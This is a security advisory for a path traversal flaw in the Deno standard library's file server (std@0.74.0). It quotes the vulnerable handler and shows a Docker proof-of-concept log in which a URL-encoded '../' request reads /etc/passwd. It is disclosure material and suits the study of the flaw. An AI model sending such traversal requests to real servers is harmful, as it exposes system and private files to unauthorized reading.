# Deno File Server (std@0.74.0) Path Traversal

This document describes "CWE-22: Improper Limitation of a Pathname to a Restricted Directory ('Path Traversal')" found in [Deno File Server](https://deno.land/manual/examples/file_server) in Deno Standard Modules 0.74.0.

## Summary

Deno File Server in [std@0.74.0](https://deno.land/std@0.74.0) has Path Traversal vulnerability. An attacker can exploit it by sending a crafted HTTP request containing path traversal character sequences to the server.

## Details

Here is the code of the handler for serving file content or directory listing to a client.

- [The vulnerable handler](https://deno.land/std@0.74.0/http/file_server.ts#L364-402):

    ```ts
      [...]
      const handler = async (req: ServerRequest): Promise<void> => {
        let normalizedUrl = posix.normalize(req.url);         // [[ 1 ]]
        try {
          normalizedUrl = decodeURIComponent(normalizedUrl);  // [[ 2 ]]
        } catch (e) {
          if (!(e instanceof URIError)) {
              throw e;
          }
        }
        const fsPath = posix.join(target, normalizedUrl);     // [[ 3 ]]

        let response: Response | undefined;
        try {
          const fileInfo = await Deno.stat(fsPath);           // [[ 4 ]]
          if (fileInfo.isDirectory) {
            if (dirListingEnabled) {
              response = await serveDir(req, fsPath);         // [[ 5 ]]
            } else {
              throw new Deno.errors.NotFound();
            }
          } else {
            response = await serveFile(req, fsPath);          // [[ 6 ]]
          }
        } catch (e) {
          console.error(e.message);
          response = await serveFallback(req, e);
        } finally {
          if (CORSEnabled) {
            assert(response);
            setCORS(response);
          }
          serverLog(req, response!);
          try {
            await req.respond(response!);
          } catch (e) {
            console.error(e.message);
          }
        }
      };
      [...]
    ```

It performs normalization of path part of a user-supplied URL at [[ 1 ]] before decoding URI components at [[ 2 ]]. At [[ 3 ]], it joins `target`, the base directory for file server, and the normalized path.  Then, it serves file content or directory listing of `fsPath` by `serveFile` at [[ 5 ]] or `serveDir` at [[ 6 ]] on the result of `fileInfo` at [[ 4 ]].  
If an attacker supplies a URL with URI-encoded path traversal character sequences as `req.url`, it bypasses path normalization due to the order of [[ 1 ]] and [[ 2 ]].

## Demonstration

There are services constructed with Docker Compose for demonstrating PoC. We can reproduce the issue with the following instructions.

1. Build the services.

    ```sh
    docker-compose build
    ```

2. Launch the services.

    ```sh
    docker-compose up
    ```

It performs exploitaion automatically. A sample output is here:

- A sample output of PoC demo

    ```none
    % COMPOSE_DOCKER_CLI_BUILD=1 DOCKER_BUILDKIT=1 docker-compose up
    WARNING: Native build is an experimental feature and could change at any time
    Starting 2020-10-21_deno-std-0740-file-server-path-traversal_victim_1 ... done
    Starting 2020-10-21_deno-std-0740-file-server-path-traversal_user_1   ... done
    Starting 2020-10-21_deno-std-0740-file-server-path-traversal_attacker_1 ... done
    Attaching to 2020-10-21_deno-std-0740-file-server-path-traversal_victim_1, 2020-10-21_deno-std-0740-file-server-path-traversal_user_1, 2020-10-21_deno-std-0740-file-server-path-traversal_attacker_1
    victim_1    | HTTP server listening on http://0.0.0.0:4507/
    user_1      | 🦕 .oO( Deno File Server is running! )
    victim_1    | [2020-10-21 06:07:26] "GET /deno.txt HTTP/1.1" 200
    2020-10-21_deno-std-0740-file-server-path-traversal_user_1 exited with code 0
    attacker_1  | *:__main__:Reading '/etc/passwd' from 'http://victim:4507'
    victim_1    | [2020-10-21 06:07:26] "GET /%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F../etc/passwd HTTP/1.1" 200
    attacker_1  | root:x:0:0:root:/root:/bin/bash
    attacker_1  | daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
    attacker_1  | bin:x:2:2:bin:/bin:/usr/sbin/nologin
    attacker_1  | sys:x:3:3:sys:/dev:/usr/sbin/nologin
    attacker_1  | sync:x:4:65534:sync:/bin:/bin/sync
    attacker_1  | games:x:5:60:games:/usr/games:/usr/sbin/nologin
    attacker_1  | man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
    attacker_1  | lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
    attacker_1  | mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
    attacker_1  | news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
    attacker_1  | uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
    attacker_1  | proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
    attacker_1  | www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
    attacker_1  | backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
    attacker_1  | list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
    attacker_1  | irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
    attacker_1  | gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
    attacker_1  | nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
    attacker_1  | _apt:x:100:65534::/nonexistent:/usr/sbin/nologin
    attacker_1  | 
    2020-10-21_deno-std-0740-file-server-path-traversal_attacker_1 exited with code 0
    ```
